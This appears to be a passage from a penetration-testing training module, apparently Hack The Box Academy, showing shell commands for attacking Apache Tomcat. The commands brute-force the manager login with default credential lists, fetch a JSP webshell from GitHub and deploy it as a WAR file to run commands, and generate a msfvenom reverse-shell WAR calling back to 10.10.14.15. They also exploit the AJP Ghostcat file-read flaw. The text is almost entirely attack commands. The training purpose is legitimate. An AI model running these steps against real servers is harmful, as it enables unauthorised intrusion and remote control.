...
```shell-session
swmpdnky@htb[/htb]$ echo YWRtaW46dmFncmFudA== |base64 -d
...
```shell-session
swmpdnky@htb[/htb]$ python3 mgr_brute.py  -h
...
```shell-session
swmpdnky@htb[/htb]$ python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
...
![](/storage/modules/113/tomcat_mgr.webp)
...
```shell-session
swmpdnky@htb[/htb]$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
swmpdnky@htb[/htb]$ zip -r backup.war cmd.jsp 
...
```shell-session
swmpdnky@htb[/htb]$ curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
...
```shell-session
swmpdnky@htb[/htb]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
...
```shell-session
swmpdnky@htb[/htb]$ nmap -sV -p 8009,8080 app-dev.inlanefreight.local
...
```shell-session
swmpdnky@htb[/htb]$ python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 
